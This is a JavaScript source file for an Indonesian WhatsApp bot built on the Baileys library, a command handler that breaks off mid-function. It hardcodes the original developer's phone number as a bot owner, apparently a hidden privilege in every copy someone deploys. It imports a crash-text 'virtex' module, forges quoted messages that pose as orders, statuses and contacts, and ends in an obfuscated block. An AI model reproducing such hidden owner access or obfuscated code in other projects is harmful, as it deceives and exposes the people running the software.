/*

GK KASI CREDIT YT SIEGRIN, GK USAH RE UPLOAD
SUSAH" NGE FIX, LU CUMA NUMPANG NAMA DOANG
YANG BELUM PAHAM CAR RUN DI HEROKU TONTON AJA VIDEO SEBELUMNYA
JASA RUN HEROKU BISA PC wa.me/6289530298948 BIAR BOT NYA GAK TERLALU DELAY
	
*/   
const {
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
WALocationMessage,
WA_MESSAGE_STUB_TYPES,
WA_DEFAULT_EPHEMERAL,
ChatModification,
WAMessageProto,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
waChatKey,
relayWAMessage,
mentionedJid,
processTime,
Browsers } = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const simple = require('./lib/bot/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const moment = require("moment-timezone")
const qrcodes = require('qrcode');
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const crypto = require('crypto')
const fsx = require("fs-extra")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const ig = require('insta-fetcher')
const hx = require('hxz-api')
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const got = require("got");
const imageToBase64 = require('image-to-base64')
const ID3Writer = require('browser-id3-writer');	
const imgbb = require('imgbb-uploader')	
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { ind } = require('./language')
const setting = JSON.parse(fs.readFileSync('./settings.json'))

const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/bot/functions')
const { color, bgcolor } = require('./lib/bot/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/bot/fetcher')
const { yta, ytv, igdl, upload } = require('./lib/bot/ytdl')
const { webp2mp4File} = require('./lib/bot/webp2mp4')
const { msgFilter } = require('./lib/bot/antispam')
const { recognize } = require('./lib/bot/ocr')
const { addVote, delVote } = require('./lib/bot/vote')
const { cmdadd } = require('./lib/bot/totalcmd.js')
const { sleep, isAfk, cekafk, addafk } = require('./lib/bot/offline')
const { addCmd, getCommandPosition, getCmd ,checkSCommand } = require('./lib/bot/scommand.js')
const { addCommands, checkCommands, deleteCommands } = require('./lib/bot/commandsrespon.js')

const { getRegisteredRandomId, addRegisteredUser, createSerial , checkRegisteredUser } = require('./lib/user/registered.js')
const { addATM, addKoinUser, checkATMuser, confirmATM } = require('./lib/user/uang.js')		
const { addLimit, addLimitUser, checkLimituser, confirmLIMIT } = require('./lib/user/limit.js')
const { getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId } = require('./lib/user/level.js')

const setiker = JSON.parse(fs.readFileSync('./strg/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./strg/video.json'))
const audionye = JSON.parse(fs.readFileSync('./strg/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./strg/image.json'))


const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const { virtex, vipi } = require('./src/virtex.js')
const zalgo = require('./src/zalgo')
const vapor = require('vapor-text')
const { antivirtexx } = require('./src/antivirtex.js')

const welkom = JSON.parse(fs.readFileSync('./database/group/welkom.json'))
const ntilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'))
const eventtime = JSON.parse(fs.readFileSync('./database/group/eventtime.json'))

const ban = JSON.parse(fs.readFileSync('./database/user/banned.json'))
const prem = JSON.parse(fs.readFileSync('./database/user/premium.json'))

const antivirtex = JSON.parse(fs.readFileSync('./database/group/antivirtex.json'))
const bad = JSON.parse(fs.readFileSync('./database/group/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/group/badword.json'))
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'))
const _registered = JSON.parse(fs.readFileSync('./database/bot/registered.json'))
const commandsrespon = JSON.parse(fs.readFileSync('./database/bot/commands.json'))
const scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))
const _win = JSON.parse(fs.readFileSync('./database/bot/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./database/bot/tttlose.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/bot/tictactoe.json"))
const afk = JSON.parse(fs.readFileSync('./database/bot/off.json'))
const voting = JSON.parse(fs.readFileSync('./database/bot/voting.json'))

//Theme
cecan = "cecan" 
cogan = "cogan" 
genshin = "genshin" 
meme = "meme" 
lol = "lol" 
ml = "ml"
deflttheme = "logo" 
themenye = `${cecan}` 
//ANTILINK
linkcom = ".com" 
linkid = ".id" 
linkxyz = ".xyz" 
linkly = ".ly" 
linkhttp = "http" 
linkwa = "://chat.whatsapp.com"
deflt = "//chat.whatsapp.com" 
linknye = `${deflt}` 

owner = setting.owner
developer = setting.developer
dev = `6289530298948@s.whatsapp.net` // jangan digantin
ow = `${owner}@s.whatsapp.net`// jangan digantin
ownername = setting.ownername
github = setting.github 
myyoutube = setting.myyoutube
mytiktok = setting.mytiktok
mytwitter = setting.mytwitter
fakereply = setting.fakereply

// DONASI
donasi = setting.donasi
rekening = setting.rekening
trakteer = setting.trakteer
saweria = setting.saweria
mybio = setting.mybio
// Info Setting
botver = setting.botver
targetpc = setting.ownerNumber
owner = targetpc
namo = setting.namo
ator = setting.ator
fake = setting.fake
prefix = setting.prefix 

bugc = false // Antibug Gc 
antitrol = false // Antifake Trolli 
antitags = false // Antitag 
readG = false // Auto Read Group 
readP = false // Auto Read Private 
multi = true 
mainmenu = false
banChats = false
pref = '?' 

// Gak Usah Diubah
hit_today = []
blocked = []
offline = false
numbernye = '0'
waktu = '-'
alasan = '-'

const own = [`${owner}@s.whatsapp.net`,'6289530298948@s.whatsapp.net']
const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:Siegrin\nORG: Jasa Bikin Bot\nTEL;type=CELL;type=VOICE;waid=6289530298948:+6289530298948\nEND:VCARD`
const vcardowner = `BEGIN:VCARD\nVERSION:3.0\nFN:${ownername}\nORG: ${fake}\nTEL;type=CELL;type=VOICE;waid=${owner}:+${owner}\nEND:VCARD`
 


const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
winawal = 1 // Win Tictactoe 
loseawal = 1 // Lose Tictactoe 
memberwin = 1 // Win 
memberlose = 1 // Lose 

const { setTtt, getWins, getWin, getLose, generateBoard } = require('./lib/bot/tictactoe.js')

battery = {
  persen: "" || "tidak terdeteksi",
  charger: "" || false
};
//=================================================//
module.exports = client = async (client, mek) => {
try {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && mek.key.remoteJid == 'status@broadcast') return
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `© luc bot APIs 2021${longkapnye}\`\`\`BUGGC TERDETEKSI\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by mans_\n*Jangan maen bug tod*`
client.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
client.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
client.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}
global.blocked
//m = simple.smsg(client, mek)
//let { mentionedd } = m
const content = JSON.stringify(mek.message)
const m = simple.smsg(client, mek)
const from = mek.key.remoteJid
const { quotedMek, isQuotedMek, mentioned} = mek
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product, buttonsMessage } = MessageType
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const type = Object.keys(mek.message)[0]
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
// var prefix = ''
var prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+,;]/gi) : '!'  	
} else {
prefix = pref
}
body = (type === 'listResponseMessage' && mek.message.listResponseMessage.selectedRowId) ? mek.message.listResponseMessage.selectedRowId : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
chats = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
const arg = chats.slice(command.length + 2, chats.length)
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
if (isCmd) cmdadd()
const totalhit = JSON.parse(fs.readFileSync('./database/bot/totalcmd.json'))[0].totalcmd
hit_today.push(command)
const q = args.join(' ')
const botNumber = client.user.jid
const botNumberss = client.user.jid + '@c.us'
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? client.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
pushname = client.contacts[sender] != undefined ? client.contacts[sender].vname || client.contacts[sender].notify : undefined
const isRegistered = checkRegisteredUser(sender)
const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
const wib = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
const totalchat = await client.chats.all()
const totalgroup = await client.chats.array.filter(v => v.jid.endsWith('g.us'))
const totalkontak = await client.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
isStc = `${isStc}`
const isStcQ = isStc !== "" && content.includes("extendedTextMessage") 
isStc !== "" && content.includes("conversation") 
const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
const isStcVideo = isStcMedia && content.includes("videoMessage")
const isStcImage = isStcMedia && content.includes("imageMessage")
const isStcSticker = isStcMedia && content.includes("stickerMessage")
const isStcTeks = isStcMedia && content.includes("quotedMessage")
const isStcDocs = isStcMedia && content.includes("documentMessage")
const isStcContact = isStcMedia && content.includes("contactMessage")
const isStcAudio = isStcMedia && content.includes("audioMessage")
const isStcLoca = isStcMedia && content.includes("locationMessage")
const isStcTag = isStcMedia && content.includes("mentionedJid")
const isStcReply = isStcMedia && content.includes("Message")
const isStcProd = isStcMedia && content.includes("productMessage")
const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isWelkom = isGroup ? welkom.includes(from) : false
const isOwner = own.includes(sender) || mek.key.fromMe
const isBanned = blocked.includes(sender)
const isPremium = prem.includes(sender) || isOwner
const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
const AntiLink = isGroup ? ntilink.includes(from) : false
const isEvento = isGroup ? eventtime.includes(from) : false
const isBadWord = isGroup ? badword.includes(from) : false
const isVote = isGroup ? voting.includes(from) : false
const senderNumber = sender.split("@")[0]
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const player = `${sender.split("@")[0]}@s.whatsapp.net`
const numbernye = `0@s.whatsapp.net`
const isBtMsg = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
const isStMsg = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
const lucBulan = ['Bulan','Tahun','Hari','Minggu','Jam','Detik','Menit','Abad']
const lucBulan1 = lucBulan[Math.floor(Math.random() * (lucBulan.length))]
const date1 = Math.ceil(Math.random() * 100)
const point = Math.floor(Math.random() * 1) + 0
const luchit = hit_today.length
const thumbnail = imagenye[Math.floor(Math.random() * imagenye.length)];
const WMthumb = fs.readFileSync(`src/siegrin.jpeg`)
const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = client.user.phone
const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const hariRaya = new Date('Jan 12, 2022 07:00:00')
const sekarang = new Date().getTime();
const Selisih = hariRaya - sekarang;
const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
var date = new Date();
var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var waktoo = date.getHours();
switch(hari) {
case 0: hari = "Minggu"; break;
case 1: hari = "Senin"; break;
case 2: hari = "Selasa"; break;
case 3: hari = "Rabu"; break;
case 4: hari = "Kamis"; break;
case 5: hari = "Jum`at"; break;
case 6: hari = "Sabtu"; break;
}
switch(bulan1) {
case 0: bulan1 = "Januari"; break;
case 1: bulan1 = "Februari"; break;
case 2: bulan1 = "Maret"; break;
case 3: bulan1 = "April"; break;
case 4: bulan1 = "Mei"; break;
case 5: bulan1 = "Juni"; break;
case 6: bulan1 = "Juli"; break;
case 7: bulan1 = "Agustus"; break;
case 8: bulan1 = "September"; break;
case 9: bulan1 = "Oktober"; break;
case 10: bulan1 = "November"; break;
case 11: bulan1 = "Desember"; break;
}
var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
var tampilWaktu = "" + jam + ":" + menit + ":" + detik ;   

myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];
var tgl = new Date();
detik = tgl.getSeconds();
menit = tgl.getMinutes();
jam = tgl.getHours();
var ampm = jam >= 12 ? 'PM' : 'AM';
var day = tgl.getDate()
bulan = tgl.getMonth()
var thisDay = tgl.getDay(),
thisDay = myDays[thisDay];
var yy = tgl.getYear()
var year = (yy < 1000) ? yy + 1900 : yy;
const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`


//WAKTU	
 const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var hahh = '🌃Malam'
                                        }
if(time2 < "19:00:00"){
var hahh = '🌇Petang'
}
if(time2 < "18:00:00"){
var hahh = '🌁️Sore'
}
if(time2 < "15:00:00"){
var hahh = '🌅Siang'
}
if(time2 < "11:00:00"){
var hahh = '🌄Pagi'
}
if(time2 < "05:00:00"){
var hahh = '🌃Malam'
}

//STIKER MENHERAN GANTI KALO ADA		
registc = fs.readFileSync('./lib/sticker/kamu sudah terdaftar.webp')
adminstc = fs.readFileSync('./lib/sticker/kamu bukan admin!.webp')
errorstc = fs.readFileSync('./lib/sticker/error.webp')
grupstc = fs.readFileSync('./lib/sticker/pakai itu digrup!.webp')
botadmstc = fs.readFileSync('./lib/sticker/jadiin aku admin.webp')
loadingstc = fs.readFileSync('./lib/sticker/loading.webp')
banstc = fs.readFileSync('./lib/sticker/kamu di ban.webp')
ownerstc = fs.readFileSync('./lib/sticker/kamu bukan ownerku!.webp')
daftarstc = fs.readFileSync('./lib/sticker/daftar dulu!.webp')
waitstc = fs.readFileSync('./lib/sticker/tunggu sebentar.webp')
kickstc = fs.readFileSync('./lib/sticker/kamu akan ku kick.webp')
welcomestc = fs.readFileSync('./lib/sticker/welcome.webp')
leavestc = fs.readFileSync('./lib/sticker/leave.webp')
needownstc = fs.readFileSync('./lib/sticker/kamu butuh ownerku.webp')
premiumstc = fs.readFileSync('./lib/sticker/kamu butuh akses premium!.webp')
successtc = fs.readFileSync('./lib/sticker/berhasil.webp')


//KIRIM PESAN	
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}

const replyex = (teks) => { client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{sendEphemeral: true}})}
const replysticker = (stiker) => { client.sendMessage(from, stiker, sticker, {quoted:mek, contextInfo:{sendEphemeral: true}})}

const reply = (teks) => {
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{sendEphemeral: true, mentionedJid: [player, dev, ow, numbernye], "externalAdReply":{"title": `${hahh} ${pushname}`,"body": `${fakereply}`,"previewType": "PHOTO","thumbnailUrl": ` `,"thumbnail": WMthumb,"sourceUrl": `${mybio}`}}})
}
const sendMess = (hehe, teks) => {
client.sendMessage(hehe, teks, text)
}

const mentions = (teks, memberr, id) => {(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr} }) : client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
}
const fakethumb = (teks, yes) => {client.sendMessage(from, teks, image, {thumbnail:WMthumb,quoted:mek,caption:yes})}

//FAKE ITEM
const fakeitem = (teks) => {
client.sendMessage(from, teks, text, {
quoted: {
key:{
fromMe:false,
participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289530298948-1604595598@g.us" }: {})
},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":WMthumb,"itemCount":`${date1}`,"status":"INQUIRY","surface":"CATALOG","message":fake,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}

const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289530298948-1604595598@g.us" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": WMthumb 
},
"title": 'Whatsapp bot', 
"description": fake, 
"currencyCode": "IDR",
"priceAmount1000": "50000000",
"retailerId": 'Whatsapp bot',
"productImageCount": `${date1}`
},
"businessOwnerJid": `0@s.whatsapp.net`
}}}

const fakegroup = (teks) => {
            client.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289530298948-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": WMthumb,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
		
		const fstatus = {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail":  WMthumb,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
	}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

//FAKE REPLY
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289530298948-1604595598@g.us"  }, "message": {orderMessage: {itemCount: `${date1}`,status: 200, thumbnail: WMthumb, surface: 200, message: fake, orderTitle: 'L', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fdoc = {key :  {participant : '0@s.whatsapp.net'},message: {documentMessage:{title: fake,jpegThumbnail: WMthumb}}}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":fake, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': fake, 'jpegThumbnail': WMthumb}}}
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": fake, 'jpegThumbnail': WMthumb}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":fake, "h": `Hmm`,'seconds': '99999', 'caption': fake, 'jpegThumbnail': WMthumb}}}
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: fake,jpegThumbnail: WMthumb}}}
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${ownername}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': WMthumb, thumbnail: WMthumb,sendEphemeral: true}}}
var fakeReplyList = ['ftroli', 'fdoc', 'fvn', 'fgif', 'fgclink', 'fvideo', 'floc', 'fkontak']
var fakeReply = fakeReplyList[Math.floor(Math.random() * fakeReplyList.length)];

const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        client.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    client.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}, thumbnail: Buffer.alloc(0)})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return client.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return client.sendMessage(from, teks, text, {quoted: mek, wmthumbnail: fs.readFileSync(`image/${wmthumbnail}`)})
        }

const _0x145ea7=_0x62c0;(function(_0x2a2367,_0x67be38){const _0x5b4827=_0x62c0,_0x292f79=_0x2a2367();while(!![]){try{const _0x57dc3e=parseInt(_0x5b4827(0xec))/0x1+-parseInt(_0x5b4827(0xe2))/0x2*(-parseInt(_0x5b4827(0xdd))/0x3)+-parseInt(_0x5b4827(0xda))/0x4+-parseInt(_0x5b4827(0xe7))/0x5*(-parseInt(_0x5b4827(0xf5))/0x6)+-parseInt(_0x5b4827(0xef))/0x7+parseInt(_0x5b4827(0xea))/0x8+-parseInt(_0x5b4827(0xd9))/0x9*(parseInt(_0x5b4827(0xe4))/0xa);if(_0x57dc3e===_0x67be38)break;else _0x292f79['push'](_0x292f79['shift']());}catch(_0x5f5cc7){_0x292f79['push'](_0x292f79['shift']());}}}(_0x3dae,0x4fad9));let contrii=[];for(let i of ow){contrii[_0x145ea7(0xf8)]({'displayName':_0x145ea7(0xe9)+fake,'vcard':vcard},{'displayName':'Developer\x20'+fake,'vcard':vcardowner});}let contri1=[];for(let i of ow){contri1['push']({'displayName':_0x145ea7(0xe9)+fake,'vcard':vcard},{'displayName':'Developer\x20'+fake,'vcard':_0x145ea7(0xf7)},{'displayName':_0x145ea7(0xeb),'vcard':vcardowner});}const sendButtonNotRegis=(_0x2798f5,_0x3f6f6f,_0x3a8f2b,_0xbfc8b3=[],_0x26ef59={})=>{const _0x23cb09=_0x145ea7,_0x33be76={'contentText':_0x3f6f6f,'footerText':_0x3a8f2b,'buttons':_0xbfc8b3,'headerType':0x1};client[_0x23cb09(0xd8)](from,daftarstc,sticker,{'quoted':mek,'contextInfo':{'sendEphemeral':!![]}}),setTimeout(()=>{const 